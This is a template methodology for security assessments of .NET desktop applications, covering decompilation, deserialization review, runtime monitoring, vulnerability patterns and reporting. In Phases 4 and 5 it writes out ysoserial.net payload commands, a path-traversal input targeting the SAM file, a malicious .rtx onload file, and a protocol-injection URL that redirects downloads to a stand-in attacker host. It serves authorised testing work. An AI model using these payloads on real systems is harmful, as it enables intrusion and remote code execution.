# .NET Application Security Assessment Methodology

> **Template Version:** 1.1
> **Derived From:** Historical engagements
> **Purpose:** Systematic security assessment of .NET thick client applications

---

## Methodology Overview

This method covers .NET desktop applications.
The phases cover application files, source reconstruction, runtime behavior, vulnerabilities, proof of concept, and reporting.
Record the target assemblies and runtime version before analysis.

```
┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐    ┌─────────────┐
│   Intel     │ → │   Static    │ → │   Dynamic   │ → │   Exploit   │ → │   Report    │
│             │    │  Analysis   │    │  Analysis   │    │    Dev      │    │             │
└─────────────┘    └─────────────┘    └─────────────┘    └─────────────┘    └─────────────┘
      │                  │                  │                  │                  │
  Enumerate          Decompile         Runtime            PoC              Findings
  attack surface     + review          testing          creation
```

Use the command examples with the selected target values.
Replace example paths, addresses, identifiers, and credentials before execution.
Record observed results in the deliverables.

---

## Phase 1: Intelligence

### 1.1 Artifact Collection

```bash
# Collect all application files
find /path/to/app -name "*.dll" -o -name "*.exe" | tee assemblies.txt
find /path/to/app -name "*.config" | tee configs.txt
find /path/to/app -name "*.pdb" | tee symbols.txt

# Hash all artifacts
sha256sum $(cat assemblies.txt) > hashes.txt
```

### 1.2 Assembly Inventory

| Assembly | Type | Signed | .NET Version | Notes |
|----------|------|--------|--------------|-------|
| App.exe | Executable | Yes/No | 4.8 | Entry point |
| Lib.dll | Library | Yes/No | 4.8 | Business logic |

### 1.3 Entry Point Identification

- **Executable entry points:** Main(), WinMain()
- **Service entry points:** ServiceBase implementations
- **Web entry points:** Global.asax, Startup.cs
- **COM entry points:** Registered COM objects

### Deliverable
- [ ] `artifact-inventory.md` - Complete file listing with hashes
- [ ] `entry-points.md` - Identified entry points

---

## Phase 2: Static Analysis

### 2.1 Decompilation

```bash
# dnSpy (GUI)
dnSpy.exe /path/to/assembly.dll

# ILSpy (CLI)
ilspycmd -p -o ./decompiled /path/to/assembly.dll

# JetBrains dotPeek
dotPeek.exe /path/to/assembly.dll
```

### 2.2 Architecture Mapping

Record the application architecture:

```
┌─────────────────────────────────────────────────────────┐
│ Presentation Layer                                       │
│ - WPF/WinForms UI                                       │
│ - Custom controls                                        │
└────────────────────────┬────────────────────────────────┘
                         │
┌────────────────────────▼────────────────────────────────┐
│ Business Logic Layer                                     │
│ - ViewModels                                             │
│ - Services                                               │
│ - Handlers                                               │
└────────────────────────┬────────────────────────────────┘
                         │
┌────────────────────────▼────────────────────────────────┐
│ Data Layer                                               │
│ - Repositories                                           │
│ - ORM/ADO.NET                                           │
│ - File I/O                                              │
└─────────────────────────────────────────────────────────┘
```

### 2.3 Protocol Handler Analysis

Identify custom URI scheme handlers:

```csharp
// Look for URL protocol registration
[DllImport("urlmon.dll")]
public static extern int CoInternetIsFeatureEnabled(...);

// Registry-based protocol handlers
HKEY_CLASSES_ROOT\<protocol>\shell\open\command
```

**Common patterns:**
- `app://command?action=X`
- `mailto:` body injection
- Custom file type handlers

### 2.4 Deserialization Analysis

**High-risk deserializers:**
```csharp
// BinaryFormatter (DANGEROUS)
BinaryFormatter bf = new BinaryFormatter();
object obj = bf.Deserialize(stream);

// NetDataContractSerializer (DANGEROUS)
NetDataContractSerializer ser = new NetDataContractSerializer();

// XmlSerializer (with Type parameter - RISKY)
XmlSerializer xs = new XmlSerializer(typeof(dynamic));

// JSON.NET with TypeNameHandling (DANGEROUS)
JsonConvert.DeserializeObject(json, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All
});
```

**Search patterns:**
```bash
grep -rn "BinaryFormatter\|NetDataContractSerializer\|DataContractSerializer" ./decompiled/
grep -rn "TypeNameHandling\.\(All\|Auto\|Objects\|Arrays\)" ./decompiled/
```

### 2.5 Command Injection Points

Find command dispatch patterns:

```csharp
// Command routing
void HandleCommand(string commandUrl) {
    var parsed = ParseCommand(commandUrl);
    switch(parsed.Action) {
        case "SetPref":
            SetPreference(parsed.Key, parsed.Value);  // INJECTION POINT
            break;
    }
}
```

### 2.6 File Type Handler Mapping

| Extension | Handler | Risk Level | Notes |
|-----------|---------|------------|-------|
| .rtx | TinyMCE injection | HIGH | No sanitization |
| .pfc | BinaryFormatter | CRITICAL | Deserialization RCE |
| .config | ConfigurationManager | MEDIUM | Sensitive data |

### Deliverable
- [ ] `architecture.md` - Application architecture diagram
- [ ] `protocol-handlers.md` - URI scheme documentation
- [ ] `deserialization-points.md` - Serialization analysis
- [ ] `static-findings.md` - Static analysis findings

---

## Phase 3: Dynamic Analysis

### 3.1 Runtime Monitoring

```powershell
# Process Monitor filters
Process Name: App.exe
Operation: RegQueryValue, RegSetValue
Operation: CreateFile, WriteFile
Path contains: config|settings|pref

# API Monitor
Monitor: System.Net.*, System.IO.*, System.Security.*
```

### 3.2 Network Traffic Analysis

```bash
# Proxy all traffic
export HTTP_PROXY=http://127.0.0.1:8080
export HTTPS_PROXY=http://127.0.0.1:8080

# Burp Suite configuration
# - Add target to scope
# - Enable invisible proxying for thick clients
# - Install CA certificate in Windows trust store
```

### 3.3 IPC Enumeration

```powershell
# Named pipes
Get-ChildItem \\.\pipe\ | Where-Object { $_.Name -match "App" }

# COM objects
Get-WmiObject Win32_COMClass | Where-Object { $_.Caption -match "App" }

# .NET Remoting
Search for RemotingConfiguration.Configure()
```

### 3.4 Input Vector Testing

Do the tests for each identified input vector:

| Vector | Test Input | Expected Behavior | Actual Behavior |
|--------|------------|-------------------|-----------------|
| Address bar | `appscheme://cmd?x=1` | Execute command | [Document] |
| File open | malicious.rtx | Parse as RTF | [Document] |
| Import | malicious.pfc | Validate type | [Document] |

### Deliverable
- [ ] `runtime-behavior.md` - Dynamic analysis observations
- [ ] `network-traffic.md` - Captured traffic analysis
- [ ] `ipc-mapping.md` - IPC channel documentation

---

## Phase 4: Vulnerability Identification

### 4.1 Common .NET Vulnerabilities

#### Deserialization
```csharp
// Vulnerable pattern
BinaryFormatter bf = new BinaryFormatter();
bf.Binder = new CustomBinder();  // May not prevent all gadgets
object obj = bf.Deserialize(untrustedStream);

// Attack: ysoserial.net payload generation
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe"
```

#### SQL Injection
```csharp
// Vulnerable
string query = "SELECT * FROM users WHERE id = " + userId;
cmd.CommandText = query;

// Secure
cmd.CommandText = "SELECT * FROM users WHERE id = @id";
cmd.Parameters.AddWithValue("@id", userId);
```

#### Path Traversal
```csharp
// Vulnerable
string path = Path.Combine(basePath, userInput);
File.ReadAllText(path);  // userInput = "..\..\..\..\windows\system32\config\sam"

// Secure
string fullPath = Path.GetFullPath(Path.Combine(basePath, userInput));
if (!fullPath.StartsWith(Path.GetFullPath(basePath)))
    throw new SecurityException("Path traversal attempt");
```

#### Command Injection
```csharp
// Vulnerable
Process.Start("cmd.exe", "/c " + userInput);

// Secure
Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.Arguments = "/c \"" + userInput.Replace("\"", "\\\"") + "\"";
// Still risky - avoid shell commands with user input
```

### 4.2 Trust Boundary Analysis

Map trust boundaries:

```
┌─────────────────────────────────────────────────────────┐
│ UNTRUSTED: User Input                                    │
│ - Address bar                                            │
│ - File open dialogs                                      │
│ - Network data                                           │
│ - IPC from other apps                                    │
└────────────────────────┬────────────────────────────────┘
                         │
        ─────────── TRUST BOUNDARY ───────────
                         │
┌────────────────────────▼────────────────────────────────┐
│ TRUSTED: Application Context                             │
│ - Local settings                                         │
│ - Embedded resources                                     │
│ - Signed assemblies                                      │
└─────────────────────────────────────────────────────────┘
```

### 4.3 Privilege Escalation Chains

Record escalation paths:

```
Initial Access: XSS in embedded browser
    ↓
Escalation 1: Access to appscheme://command protocol
    ↓
Escalation 2: Modify AppConfig preferences
    ↓
Escalation 3: Force download from attacker URL
    ↓
Final Impact: Arbitrary code execution on restart
```

### Deliverable
- [ ] `vulnerabilities.md` - Identified vulnerabilities
- [ ] `trust-boundaries.md` - Trust boundary analysis
- [ ] `escalation-chains.md` - Privilege escalation paths

---

## Phase 5: Proof of Concept Development

### 5.1 PoC Requirements

Each proof of concept must have these properties:
- Demonstrate the vulnerability clearly
- Use only the necessary steps
- Include cleanup steps
- Record prerequisites
- Avoid permanent damage

### 5.2 PoC Template

```markdown
## PoC: [Vulnerability Title]

### Prerequisites
- [Requirement 1]
- [Requirement 2]

### Steps
1. [Step 1]
2. [Step 2]
3. [Expected result]

### Payload
```
[Payload code/data]
```

### Expected Output
[Screenshot or description]

### Cleanup
1. [Cleanup step 1]
2. [Cleanup step 2]
```

### 5.3 Common Payload Types

#### Deserialization Payload
```bash
# Generate with ysoserial.net
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc.exe" -o base64
```

#### URL Injection Payload
```javascript
// Preference manipulation
appscheme://command?action=SetGlobalPref&key=AppConfig.NetInstallUrl&value=http://attacker.com/payload.exe
```

#### File-based Payload
```html
<!-- malicious.rtx -->
<html>
<body onload="window.App.setPreference('key','value')">
</body>
</html>
```

### Deliverable
- [ ] `poc/` - All proof of concept files
- [ ] `poc-readme.md` - PoC documentation

---

## Phase 6: Reporting

### Finding Template

```markdown
## Finding: [Title]

**Severity:** [Critical/High/Medium/Low]
**CVSS:** [Score] ([Vector])
**CWE:** CWE-XXX

### Summary
[One paragraph description]

### Affected Component
```
Assembly: [name]
Class: [namespace.class]
Method: [method name]
File: [source file if available]
Line: [line number if available]
```

### Technical Details
[Detailed technical explanation]

### Reproduction Steps
1. [Step 1]
2. [Step 2]
3. [Expected result]

### Impact
[Business and technical impact]

### Remediation
```csharp
// Before (vulnerable)
...

// After (secure)
...
```

### References
- [CWE link]
- [OWASP link]
```

### Deliverable
- [ ] `assessment-report.md` - Full assessment report
- [ ] `executive-summary.md` - Executive summary

---

## Quick Reference

### Tools
| Tool | Purpose |
|------|---------|
| dnSpy | Decompilation + debugging |
| ILSpy | Decompilation |
| ysoserial.net | Deserialization payloads |
| Process Monitor | Runtime file/registry monitoring |
| API Monitor | API call tracing |
| Burp Suite | HTTP(S) interception |
| Wireshark | Network capture |

### Search Patterns
```bash
# Dangerous methods
grep -rn "BinaryFormatter\|Deserialize\|Process.Start\|SqlCommand" ./

# Hardcoded secrets
grep -rn "password\|secret\|key\|connectionstring" ./

# File operations with user input
grep -rn "File\.\(Read\|Write\|Open\)" ./
```

### CWE References
| Pattern | CWE |
|---------|-----|
| Deserialization | CWE-502 |
| Command Injection | CWE-78 |
| SQL Injection | CWE-89 |
| Path Traversal | CWE-22 |
| XSS | CWE-79 |

---

## Checklist

- [ ] Artifacts collected and hashed
- [ ] Assemblies decompiled
- [ ] Architecture mapped
- [ ] Protocol handlers documented
- [ ] Deserialization points identified
- [ ] Input vectors enumerated
- [ ] Dynamic analysis complete
- [ ] Vulnerabilities identified
- [ ] proofs of concept developed
- [ ] Report generated
